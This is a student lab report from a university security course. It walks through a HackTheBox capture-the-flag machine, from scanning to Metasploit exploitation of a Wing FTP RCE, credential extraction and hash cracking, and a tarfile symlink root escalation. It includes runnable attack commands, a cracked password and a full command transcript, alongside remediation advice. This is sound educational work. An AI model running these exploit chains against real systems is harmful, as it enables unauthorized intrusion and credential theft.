---
Title: "Technical Report: Ethical Hacking and Penetration Testing"
Project: Lab 09 - WingData Security Assessment
Subject: IT Security and Privacy
Professor: Daniel Esteban Vela López
Author: Andersson David Sánchez Méndez & Cristian Santiago Pedraza Rodríguez
Date: 2026-03-23
Location: Bogotá, Colombia
Confidentiality: Internal / Academic Use Only
---

# TECHNICAL REPORT: ETHICAL HACKING ASSESSMENT

<div align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Logo_de_la_Escuela_Colombiana_de_Ingenier%C3%ADa_-_Universidad.webp" width="250">
  <br>
  <strong>Escuela Colombiana de Ingeniería Julio Garavito</strong>
  <br>
  <br>
  <strong>Project:</strong> Lab 09 - WingData Security Assessment <br> 
  <strong>Subject:</strong> IT Security and Privacy <br> 
  <strong>Professor:</strong> Daniel Esteban Vela López <br> 
  <strong>Authors:</strong> Andersson David Sánchez Méndez & Cristian Santiago Pedraza Rodríguez <br> 
  <strong>Date:</strong> 2026-03-23 <br> 
  <strong>Location:</strong> Bogotá, Colombia <br><br> 
  <strong>Confidentiality:</strong> Internal / Academic Use Only
</div>

---

## 1. Introduction
### 1.1 Objective
The primary objective of this laboratory is to execute a controlled penetration test against the **"WingData"** target machine. By following a structured ethical hacking methodology (Reconnaissance, Scanning, Exploitation, and Post-Exploitation), we aim to identify and document security flaws while operating within a strictly defined legal and ethical scope.

<br>
<br>
<br>
<br>
<br>
<br>

### 1.2 Discussion: The Hacker's Methodology

**Perspective: Andersson David Sánchez Méndez**
> "Ethical hacking is about discipline. It’s not just about 'breaking in'; it's about following a methodology like PTES or OSSTMM to ensure that no stone is left unturned. In this lab, our priority is to move from passive information gathering to active exploitation without damaging the target's availability."

**Perspective: Cristian Santiago Pedraza Rodríguez**
> "The transition from a defensive audit to an offensive assessment is eye-opening. While SAST tools show us potential bugs, a pentest proves their actual impact. Connecting via VPN is our first layer of professional conduct—ensuring our traffic is isolated and authorized within the HackTheBox infrastructure."

---

## 2. Methodology & Tools
We are following the **PTES (Penetration Testing Execution Standard)** framework using Kali Linux:

| Phase | Tool / Config | Purpose |
| :--- | :--- | :--- |
| **Connectivity** | OpenVPN | Secure tunnel to the HTB private lab network. |
| **Reconnaissance** | nmap / whatweb | Identifying services, versions, and OS fingerprinting. |
| **Exploitation** | msfconsole / searchsploit | Executing payloads to gain unauthorized access. |
| **Documentation** | Markdown / tee | Real-time logging of commands and evidence. |

---

<br>
<br>
<br>

## 3. PHASE 0: CONNECTIVITY & VPN SETUP

### 3.1 Establishing the Secure Tunnel
Before any offensive activity, we established a connection to the HackTheBox (HTB) network. This step is critical for legal authorization and network isolation. By initializing the tunnel, our Kali Linux instance effectively joins the HTB private laboratory network, allowing direct interaction with the target.

**Connection Workflow:**
1. **Configuration**: Downloaded the personalized UDP-based `.ovpn` configuration file from the HTB dashboard.
2. **Execution**: Initialized the OpenVPN client via terminal to encapsulate our traffic.
3. **Verification**: Confirmed the creation of the `tun0` virtual interface and performed a connectivity test to the target's internal IP.

### 3.2 Technical Analysis: The Role of the VPN

**Why does HTB require a VPN connection?**
HackTheBox provides intentionally vulnerable machines. If these machines were exposed directly to the public internet, they would be compromised by malicious bots within minutes. The VPN acts as a **Gatekeeper**, ensuring only authorized students with valid certificates can interact with the lab.

**Network Boundaries and Risks:**
The tunnel creates a **Virtual Private Network (VPN)** that encapsulates our traffic. This creates a boundary where our Kali Linux machine receives a private IP (usually in the `10.x.x.x` range) that can "see" the target machine. 

Exposing a lab machine directly would be dangerous because:
1. **Uncontrolled Exploitation**: Malicious actors could use the machine as a pivot to attack other systems.
2. **Data Leakage**: Any data captured or stored on the vulnerable machine would be accessible to the entire internet.
3. **Legal Risk**: Without the encrypted tunnel, our offensive traffic could be flagged as a real attack by ISPs or automated IDS/IPS systems.

<br>
<br>
<br>

### Evidence Annex: Phase 0 (Connectivity)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **VPN Tunnel Initiation (1)** | ![[vpn-connect.png]] | Initializing the OpenVPN sequence via terminal. |
| **VPN Tunnel Initiation (2)** | ![[vpn-connect-1.png]] | Confirmation of "Initialization Sequence Completed" and tunnel stability. |
| **Interface Check** | ![[ip-addr-tun0.png]] | Verification of the `tun0` adapter and the assigned laboratory IP. |
| **Target Identification Machine** | ![[ping-target-1.png]] | Identification of the **Machine** IP within the HTB dashboard. |
| **Target Identification WingData** | ![[ping-target-2.png]] | Identification of the **WingData** target IP within the HTB dashboard. |
| **Connectivity Test** | ![[ping-target.png]] | Successful ICMP echo request confirming a clear path to the target. |

---

## 4. PHASE 1: RECONNAISSANCE & SCANNING

### 4.1 Step 1: Automated Port Scanning (Nmap)
We initiated the reconnaissance phase by performing a comprehensive scan of the target's network interface. The goal was to identify open ports, running services, and specific software versions to determine the attack surface.

**Execution Commands:**
1. **Service/Script Scan**: `nmap -sC -sV <target-ip>`
2. **Aggressive Scan**: `nmap -A <target-ip>`

**Findings:**
* **Port 22/TCP**: Open. Service: `ssh`. Version: `OpenSSH 9.2p1 Debian 2+deb12u2`.
* **Port 80/TCP**: Open. Service: `http`. Version: `Apache httpd 2.4.66`.
* **Discovery**: The HTTP service automatically redirects traffic to `http://wingdata.htb`.

### 4.2 Technical Analysis: Virtual Hosting & Redirection

**What does the redirect to `wingdata.htb` reveal?**
The redirect indicates that the web server is configured using **Name-Based Virtual Hosting**. This means the Apache server is hosting one or more websites on the same IP address, and it uses the `Host` header in the HTTP request to decide which content to serve. By redirecting us, the server is explicitly telling our client that it expects to be addressed by its domain name (`wingdata.htb`) rather than its raw IP.

**Why does the site fail to load via IP address directly?**
When accessing the site by IP, the HTTP request header looks like `Host: <target-ip>`. Since the Apache configuration is likely set to only respond to `Host: wingdata.htb`, it either drops the connection, returns a 404 error, or serves a default "Welcome" page instead of the intended application. 

> **Correction Strategy**: We must modify our local `/etc/hosts` file to map the target IP to `wingdata.htb` so that our tools and browser send the correct `Host` header.

### Evidence Annex: Phase 1 (Scanning)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Nmap Service Scan** | ![[nmap-results.png]] | Identification of SSH and Apache versions. Confirmation of the OS (Debian). |
| **HTTP Redirection** | ![[nmap-redirect-evidence.png]] | Nmap output showing the `http-title` and the redirect to `wingdata.htb`. |
| **Host Mapping** | `echo "<target-ip> wingdata.htb" | sudo tee -a /etc/hosts` | Local configuration to enable proper resolution of the virtual host. |

---

## 5. PHASE 2: HOSTNAME RESOLUTION & PASSIVE ENUMERATION

In this phase, we transitioned from network-level scanning to application-level reconnaissance. Proper resolution of the virtual host is mandatory to interact with the web server's logic and explore the platform's features.

### 5.1 Step 1: Virtual Host Configuration
As identified in Phase 1, the web server uses name-based virtual hosting. To access the site, we mapped the target IP address to the `wingdata.htb` domain within the local operating system.

**Execution:**
* **Command**: `echo "<target-ip> wingdata.htb" | sudo tee -a /etc/hosts`
* **Verification**: Navigated to `http://wingdata.htb` via browser to confirm the "Wing Data Solutions" platform is reachable.

### 5.2 Passive Reconnaissance: Landing Page Analysis
Before launching active scanning tools (like directory bruforce or vulnerability scanners), we performed a manual inspection of the landing page as an unauthenticated visitor.

**Findings from the Landing Page:**

1.  **Corporate Identity & Business Logic**: The site describes itself as a "file-sharing and encryption platform."
    * *Attacker Value*: This suggests the application handles sensitive data (uploads/downloads), making it a prime target for vulnerabilities like **Insecure Direct Object References (IDOR)** or **Path Traversal**.
2.  **Client Portal Link**: A "Client Portal" or "Login" section is visible in the navigation bar.
    * *Attacker Value*: This identifies the primary entry point for credential-based attacks, such as **Brute Force**, **Credential Stuffing**, or testing for **SQL Injection** in the login fields.
3.  **Source Code Metadata (Comments/Versions)**: By inspecting the page source (`Ctrl+U`), we can look for developer comments, specific library versions (e.g., jQuery, Bootstrap), or hidden paths.
    * *Attacker Value*: Identifying specific versions of front-end libraries allows an attacker to search for **Known Vulnerabilities (CVEs)** associated with those versions.
4.  **Hostname/Subdomain References**: Inspection of internal links or footer mentions might reveal other hosts (e.g., `dev.wingdata.htb` or `api.wingdata.htb`).
    * *Attacker Value*: Discovering subdomains expands the attack surface, potentially leading to less-secure development or staging environments.

### 5.3 Technical Analysis: Access Barriers

**Why does the site fail to load by IP address?**
The Apache web server relies on the **HTTP Host Header** provided by the browser. When using the IP, the header contains the numerical address, which does not match any configured `VirtualHost` block. Consequently, the server returns a default page or an error. By modifying the `/etc/hosts` file, we force the browser to send `Host: wingdata.htb`, triggering the correct server-side response.

### Evidence Annex: Phase 2 (Hostname & Landing Page)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Hosts Configuration** | ![[etc-hosts-edit.png]] | Mapping the target IP to `wingdata.htb` to enable virtual host resolution. |
| **Landing Page Access** | ![[landing-page-view.png]] | Visual confirmation of the Wing Data Solutions website loading correctly. |
| **Source Inspection** | ![[source-code-review.png]] | Manual review of the HTML source for hidden links or versioning data. |

---

## 6. PHASE 3: SUBDOMAIN DISCOVERY & VIRTUAL HOST FUZZING

In this phase, we move beyond the primary landing page to identify hidden entry points. Large organizations often host secondary services (like APIs, dev environments, or internal portals) on subdomains that may be less secure than the main site.

### 6.1 Step 1: Tooling Setup (SecLists)
Since modern Kali distributions do not include large wordlists by default to save space, we manually provisioned **SecLists**, the industry-standard collection of usernames, passwords, and subdomains.

* **Command**: `git clone --depth 1 https://github.com/danielmiessler/SecLists.git ~/SecLists`

### 6.2 Step 2: Virtual Host Brute-Forcing (ffuf)
We used **ffuf (Fuzz Faster U Fool)** to perform a dictionary attack against the `Host` header. By fuzzing the subdomain part of the address, we can identify which virtual hosts the Apache server is configured to serve.

* **Command executed**:
ffuf -u http://10.129.205.10 -H "Host: FUZZ.wingdata.htb" \
     -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fc 301

* **Results**: The tool identified a valid hit for **`ftp.wingdata.htb`**.
* **Configuration Update**: We updated `/etc/hosts` to ensure proper resolution:
  `10.129.205.10  wingdata.htb ftp.wingdata.htb`

### 6.3 Technical Analysis: The Impact of Discovery

**Why is subdomain enumeration a critical reconnaissance step?**

Subdomain enumeration is critical because it expands the **Attack Surface**. While the main domain (`wingdata.htb`) might be highly monitored and patched, subdomains often host legacy applications, administrative interfaces, or development versions that are frequently misconfigured or use outdated software.

**What new attack surface did discovering `ftp.wingdata.htb` reveal?**
The initial Nmap scan only showed a generic Apache server on port 80. By discovering the virtual host `ftp.wingdata.htb`, we revealed an entirely new **Logical Entry Point**: a specialized login portal for a "Wing FTP Server." This shifts our attack from a general web audit to a targeted exploit search for a specific FTP management software.

**Why is version disclosure (Wing FTP Server v7.4.3) a security risk?**
Information disclosure (Banner Grabbing) is a risk because it provides an attacker with a **precise roadmap**. Instead of guessing vulnerabilities, an attacker can search public databases (like CVE Details or Exploit-DB) for the specific version `v7.4.3`.
* **Presence impact**: It accelerates the attack by bypassing the "trial and error" phase. If a known Remote Code Execution (RCE) exists for that version, the attacker can move directly to exploitation.
* **Remediation**: The "Server" header and version footer should be disabled in the software settings (e.g., setting `ServerSignature Off` and `ServerTokens Prod` in Apache, or disabling "Show Version" in the Wing FTP admin console).

### Evidence Annex: Phase 3 (Subdomain Fuzzing)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Wordlist Setup** | `ls ~/SecLists` | Confirmation of SecLists directory for fuzzing operations. |
| **Ffuf Hit** | ![[ffuf-ftp-discovery.png]] | Capture showing the 200 OK response for the `ftp` keyword during fuzzing. |
| **New Portal** | ![[wing-ftp-portal.png]] | Landing page of the newly discovered Wing FTP Server login. |

---

## 7. PHASE 4: SYSTEM EXPLOITATION (CVE-2025-47812)

In this phase, we transition from reconnaissance to active exploitation. By leveraging the specific version information discovered in the previous phase, we identified a critical vulnerability that allows for Remote Code Execution (RCE) without valid credentials.

### 7.1 Step 1: Vulnerability Research
Using the version string identified in the `ftp.wingdata.htb` footer (**Wing FTP Server v7.4.3**), we queried the local exploit database to find publicly available attack vectors.

* **Command**: `searchsploit wing ftp`
* **Discovery**: We identified **Exploit 52347**, which documents an unauthenticated RCE via a NULL-byte authentication bypass (CVE-2025-47812).

### 7.2 Step 2: Execution via Metasploit Framework
We utilized the Metasploit Framework (MSF) to weaponize the vulnerability and establish a command-and-control (C2) channel with the target.

**Configuration & Execution:**
1. **Module Selection**: `use exploit/multi/http/wingftp_null_byte_rce`
2. **Targeting**:
   * `set RHOSTS 10.129.205.10`
   * `set VHOST ftp.wingdata.htb`
3. **Payload Setup**:
   * `set LHOST 10.10.15.90` (Local VPN IP)
4. **Action**: `run`

**Result**: The exploit successfully bypassed the authentication logic, providing a **Meterpreter session** with the privileges of the service user.

### 7.3 Technical Analysis: NULL-Byte Injection & Meterpreter

**What is a NULL-byte injection vulnerability?**

A NULL-byte injection occurs when an application handles strings using functions that treat the `\x00` (null) character as a string terminator. In the case of **CVE-2025-47812**, the authentication mechanism fails because the application logic processes the username or session token, but the underlying system or library stops reading at the injected NULL-byte. 

**Where does the confusion occur?**
The confusion typically occurs at the **Library/OS layer** (specifically in C-based libraries). While the **Application layer** (higher-level logic) might see the full string, the lower-level system calls (like `strcmp` or `open`) interpret the NULL-byte as the end of the input, effectively cutting off the password verification or "sanitizing" the input in a way the developers did not intend.

**At which phase does obtaining a Meterpreter session occur?**
Obtaining a Meterpreter session is the successful conclusion of the **Exploitation Phase**. It marks the transition from "trying to get in" to having "established access."

**How does Meterpreter differ from a raw reverse shell?**

A raw reverse shell is simply a remote command prompt (`/bin/sh`). In contrast, **Meterpreter** is an advanced, multi-functional payload that runs entirely in memory (to avoid disk detection) and offers superior **Post-Exploitation** capabilities:
* **Privilege Escalation**: Specialized commands like `getsystem`.
* **Information Gathering**: Built-in tools for keylogging, screen capturing, and dumping password hashes (`hashdump`).
* **Pivoting**: The ability to use the compromised machine as a gateway to attack other internal network segments.
* **File Interaction**: Advanced file system manipulation without triggering standard OS audit logs.

<br>
<br>

### Evidence Annex: Phase 4 (Exploitation)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Exploit Discovery** | ![[searchsploit-results.png]] | Identification of the unauthenticated RCE for the target version. |
| **MSF Configuration** | ![[msf-options.png]] | Correct setup of RHOSTS and VHOST for the virtual host attack. |
| **Session Established** | ![[meterpreter-session.png]] | Success message showing "Meterpreter session 1 opened" on the target. |

---

## 8. PHASE 5: POST-EXPLOITATION — CREDENTIAL ENUMERATION

Once the Meterpreter session was established, we moved into the post-exploitation phase. The objective was to escalate our situational awareness by identifying system users and extracting sensitive configuration data that could lead to further privilege escalation.

<br>
<br>

### 8.1 Step 1: Upgrading to a Full TTY Shell
Meterpreter provides a powerful interface, but for complex Linux commands and proper terminal interaction, a **TTY (Teletype)** shell is required. We used Python to spawn a bash shell to allow for tab completion and job control.

* **Commands**:
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /etc/passwd

* **Observation**: We identified the service account `wingftp` (running the server) and a standard system user named **`wacky`** (UID 1001), which represents our next target for lateral movement.

### 8.2 Step 2: Extracting Application Secrets
We searched the Wing FTP installation directory for configuration files that might contain user metadata or credentials.

* **Search Command**: `find /opt/wftpserver/ -name "*.xml" 2>/dev/null`
* **Discovery**: A user-specific configuration file was located at `/opt/wftpserver/Data/1/users/wacky.xml`.
* **Exfiltration**: Using the Meterpreter `download` command, we transferred the file to our local Kali machine for offline analysis.

### 8.3 Technical Analysis: Insecure Configuration Management

**Why is storing password hashes in application XML files a security risk?**

Storing hashes in flat XML files is a significant risk due to **Insecure File Permissions**. If an attacker gains low-privilege access to the server (as we did through the service account), they can often read these files directly. 
* **Static Exposure**: Unlike a dedicated database or a secure vault, these files are frequently included in system backups and are easily searchable on the disk.
* **Offline Cracking**: Once an attacker downloads the XML, they can perform high-speed brute-force or "Pass-the-Hash" attacks without triggering any network-based intrusion detection systems.

**What is the secure alternative for managing service account credentials?**
In a production environment, the secure alternative is to use a **Secrets Management Solution** (such as HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault) or a **PAM (Privileged Access Management)** system. 
* **Dynamic Injection**: Credentials should be injected into the application at runtime via environment variables or encrypted memory, rather than being written to the filesystem.
* **Strong Hashing**: If local storage is mandatory, passwords should be hashed using memory-hard algorithms like **Argon2** or **bcrypt** with a unique salt for every user, rather than standard SHA-256.

### Evidence Annex: Phase 5 (Post-Exploitation)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **TTY Upgrade** | ![[tty-shell-spawn.png]] | Transitioning from a basic shell to a functional bash environment. |
| **User Discovery** | ![[etc-passwd-view.png]] | Identification of the user `wacky` through the `/etc/passwd` file. |
| **Password Identification** | ![[etc-passwd-view-1.png]] | Identification of the password user `wacky` through the `wftpserver` path.|
| **Hash Exfiltration** | ![[xml-download.png]] | Successful use of the `download` command to retrieve `wacky.xml`. |
| **XML Content** | ![[wacky-xml-content.png]] | Discovery of the `<Password>` tag containing the SHA-256 hash. |

---

## 9. PHASE 6: OFFLINE CRYPTANALYSIS (HASH CRACKING)

In this technical phase, we performed an offline dictionary attack against the exfiltrated credential hash. This demonstrates that obtaining a hash is often equivalent to obtaining the plaintext password if the password strength is insufficient.

### 9.1 Step 1: Hash Identification
We saved the 64-character string from `wacky.xml` into a local file and utilized `hash-identifier` to determine the cryptographic algorithm used by Wing FTP.

* **Command**: `echo "<hash_detected>" > hashes.txt && hash-identifier`
* **Result**: The tool identified the hash as **SHA-256**, confirming the requirements for the next step.

### 9.2 Step 2: Dictionary Attack (Hashcat)
We utilized **Hashcat**, an industry-standard recovery tool, to compare the target hash against the **rockyou.txt** wordlist (containing millions of real-world leaked passwords).

* **Command executed**:
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt

* **Result**: The hash was successfully "cracked," revealing the plaintext password for the user **wacky**.

### 9.3 Technical Analysis: Password Strength and Policies

**What does the presence of the password in `rockyou.txt` reveal?**

If a password is found in `rockyou.txt`, it means the password is **critically weak**. This wordlist is composed of common passwords from historical data breaches. Its presence there indicates that the user chose a common, predictable string that offers zero resistance to modern cracking hardware, which can test millions of such combinations per second.

**What password policy would have made this attack impractical?**
To mitigate offline attacks, a robust password policy should include:
1.  **Increased Length**: Requiring 14+ characters significantly increases the search space (entropy).
2.  **Character Complexity**: Forcing a mix of uppercase, lowercase, numbers, and symbols prevents simple dictionary matches.
3.  **Key Stretching/Salting**: As discussed in Phase 5, using a "salt" ensures that identical passwords result in different hashes, and using algorithms like **bcrypt** or **Argon2** makes each individual guess computationally expensive.
4.  **MFA (Multi-Factor Authentication)**: In a real-world scenario, even if the password is cracked, an attacker would still be blocked by the second factor (TOTP, hardware key, etc.).

### Evidence Annex: Phase 6 (Hash Cracking)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Hash Identification** | ![[hash-id-results.png]] | Confirmation of the SHA-256 algorithm before cracking. |
| **Hashcat Execution** | ![[hashcat-running.png]] | Initializing the recovery process using GPU/CPU acceleration. |
| **Password Recovered** | ![[hashcat-cracked.png]] | Final output showing the match between the hash and the plaintext password. |

---

## 10. PHASE 7: PRIVILEGE ESCALATION & ACCESS (USER FLAG)

In this stage of the assessment, we moved from the limited service account (`wingftp`) to a full user session. By using the credentials recovered in Phase 6, we established a secure connection to the target via SSH, confirming the total compromise of the user environment.

### 10.1 Step 1: Horizontal Privilege Escalation
With the plaintext password identified as **`pasion`**, we attempted to log in as the system user `wacky`. 

**Execution:**
* **Command**: `ssh wacky@wingdata.htb`
* **Authentication**: Provided the recovered password when prompted.
* **Result**: Successfully established an encrypted SSH session, gaining access to the user's home directory and private files.

<br>
<br>

### 10.2 Step 2: Goal Achievement (Flag Retrieval)
Following the capture-the-flag (CTF) objectives, we located the `user.txt` file, which serves as cryptographic proof of successful unauthorized access.

* **Command**: `cat /home/wacky/user.txt`
* **Discovery**: The flag was successfully read, signifying the completion of the user-level exploitation.

### 10.3 Technical Analysis: SSH vs. Reverse Shells

**Why is SSH preferred over a Meterpreter shell for persistent access?**
While Meterpreter is excellent for initial exploitation, SSH is a **legitimate administrative tool**. Using SSH for persistence is stealthier because:
1.  **Traffic Normalization**: SSH traffic looks like standard administrative activity to most Network Intrusion Detection Systems (NIDS).
2.  **Stability**: SSH sessions are significantly more stable than reverse shells, which can die if the parent process is killed.
3.  **Encrypted Tunneling**: SSH inherently provides a secure, encrypted channel without the need for additional payload configuration.

**Security Reflection:**
The success of this phase highlights the **Cascading Failure** in the target's security:
1.  A software vulnerability provided initial access.
2.  Insecure file permissions allowed the reading of application secrets.
3.  Weak password choices (found in `rockyou.txt`) allowed the final transition to a full system user.

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

### Evidence Annex: Phase 7 (Final Access)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **SSH Login** | ![[ssh-login-success.png]] | Successful authentication as `wacky` via port 22. |
| **Flag Retrieval** | ![[user-flag-capture.png]] | Reading the content of `user.txt` to confirm goal completion. |
| **System Identity** | `whoami && hostname` | Confirmation of being user `wacky` on the `wingdata` host. |

---

## 11. PHASE 8: VERTICAL PRIVILEGE ESCALATION (CVE-2025-4138)

In the final phase of the engagement, we performed a vertical privilege escalation to gain administrative (**root**) control over the system. This was achieved by exploiting a misconfigured sudo privilege and a high-impact path traversal vulnerability in a Python backup script.

### 11.1 Step 1: Sudo Enumeration
After gaining access as user `wacky`, we audited the account's sudo permissions to identify potential escalation vectors.

* **Command**: `sudo -l`
* **Discovery**: The user `wacky` can execute `/opt/backup_clients/restore_backup_clients.py` as **root** without providing a password (`NOPASSWD`).

### 11.2 Step 2: Vulnerability Identification (TarSlip)
We analyzed the source code of the Python script to understand its logic.
* **Vulnerable Line**: `tarfile.extractall()` is called on a user-provided archive without specifying a filter or validating the members' paths.
* **Technical Risk**: This introduces a **TarSlip** (Path Traversal) vulnerability, where a maliciously crafted `.tar` file can write files outside the intended restoration directory.

### 11.3 Step 3: Exploitation via Symlink Chain Bypass
We utilized a sophisticated exploit script (`cve_2025_4138.py`) to bypass Python's built-in path filters by exceeding the OS `PATH_MAX` limit (4,096 bytes).

**Exploit Workflow:**
1.  **Key Generation**: Created a new SSH key pair (`wingdata_key`) on the target.
2.  **Payload Crafting**: Generated a `.tar` archive designed to "pivot" through a deep chain of symlinks to land at `/root/.ssh/authorized_keys`.
3.  **Execution**:
    ```bash
    mv backup_888.tar /opt/backup_clients/backups/
    sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_888.tar -r restore_win123
    ```

* **Outcome**: The malicious archive planted our public key into the root user's `authorized_keys`, allowing direct SSH access as root.

---

### 11.4 Technical Analysis: Tarfile Safety

**How should `tarfile.extractall()` be called safely?**
To prevent path traversal, the extraction should be restricted to a specific directory using the **data filter** (available in newer Python versions):
> `tarfile.extractall(path=destination, filter='data')`

**What built-in Python mechanism exists since Python 3.12?**
Since **Python 3.12**, a new **Extraction Filter** mechanism was introduced. By default, it encourages the use of `filter='data'`, which automatically blocks features like absolute paths, parent directory references (`..`), and symlinks that point outside the destination.

---

### 11.5 Technical Analysis: Sudo Misconfiguration

**What made the script a viable escalation vector?**
The combination of **Sudo execution as root** and **Unsafe input handling** (extracting archives) created a "God-mode" primitive. Since the script runs with root's effective UID, any file it writes—even via a path traversal—is owned by root and can overwrite critical system files like `.ssh/authorized_keys` or `/etc/shadow`.

**What general principle do `NOPASSWD` entries violate?**
They violate the **Principle of Least Privilege** and **Multi-Factor Trust**. `NOPASSWD` removes the last barrier of defense; if a user's account is compromised, the attacker has a direct, automated path to root without needing to know the user's password.

> **Audit Strategy**: Sudo privileges should be audited using tools like `Lynis` or manual checks (`sudo -l`), ensuring that only specific, hardened binaries are allowed, and always requiring re-authentication unless strictly necessary for automated services.

---

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

### Evidence Annex: Phase 8 (Root Access)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Sudo Permissions** | ![[sudo-l-output.png]] | Identification of the unsafe Python script allowed as root. |
| **Read Script** | ![[wacky-exec-script.png]] | Identification the vulnerability of the wacky script. |
| **Exploit Generation** | ![[exploit-tar-gen.png]] | Creating the symlink-based path traversal archive. |
| **Root Flag** | ![[root-flag-access.png]] | Final proof of total system compromise. |

---

## 12. CONCLUSIONS & LESSONS LEARNED

1.  **Cascading Security Failures**: The assessment demonstrated how a single software vulnerability (CVE-2025-47812) can lead to full system compromise when combined with poor internal configurations, such as insecure file permissions and weak password policies.
2.  **The Criticality of Patch Management**: The transition from reconnaissance to exploitation was significantly accelerated by the exposure of software versions in the web footer. Keeping services updated and hiding version banners is a fundamental defense layer.
3.  **The Double-Edged Sword of Sudo**: Granting `NOPASSWD` permissions to scripts that handle external input (like `.tar` files) is a high-risk practice. Even a minor logic flaw in a script (like an unsafe `extractall()`) can grant an attacker administrative control.
4.  **Defense in Depth**: Cryptographic protections (SHA-256) are only as strong as the human factor. The use of dictionary-based passwords (`pasion`) rendered the system's hashing efforts obsolete.

---

## 13. BIBLIOGRAPHIC REFERENCES

* **MITRE Corporation.** (2025). *CVE-2025-47812: Wing FTP Server NULL-byte Authentication Bypass*. Retrieved from [https://cve.mitre.org](https://cve.mitre.org)
* **Offensive Security.** (2026). *Metasploit Framework Documentation*. Retrieved from [https://docs.metasploit.com](https://docs.metasploit.com)
* **Python Software Foundation.** (2024). *Tarfile Module Security - Extraction Filters*. Python 3.12 Documentation.
* **The PTES Team.** (2025). *Penetration Testing Execution Standard*. Retrieved from [http://www.pentest-standard.org](http://www.pentest-standard.org)
* **Daniel Miessler.** (2026). *SecLists: The Asset Inventory for Security Assessments*. GitHub.

---

<br>
<br>
<br>
<br>
<br>

## 14. RAW COMMANDS TRANSCRIPT (EXECUTIVE SUMMARY)

```bash
# Phase 0: Connectivity
sudo openvpn --config ~/HTB-Andersson.ovpn

# Phase 1: Reconnaissance
nmap -sC -sV wingdata.htb
ffuf -u [http://10.129.13.98](http://10.129.13.98) -H "Host: FUZZ.wingdata.htb" -w subdomains.txt

# Phase 2: Exploitation (Initial Access)
msfconsole -q -x "use exploit/multi/http/wingftp_null_byte_rce; set RHOSTS 10.129.13.98; set VHOST ftp.wingdata.htb; set LHOST 10.10.15.90; run"

# Phase 3: Post-Exploitation & Cracking
cat /opt/wftpserver/Data/1/users/wacky.xml
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Phase 4: Vertical Privilege Escalation (Root)
ssh-keygen -t ed25519 -f ~/wingdata_key -N ""
python3 cve_2025_4138.py --tar-out backup_888.tar --preset ssh-key --payload ~/wingdata_key.pub
mv backup_888.tar /opt/backup_clients/backups/
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_888.tar -r restore_win123
ssh -i ~/wingdata_key root@localhost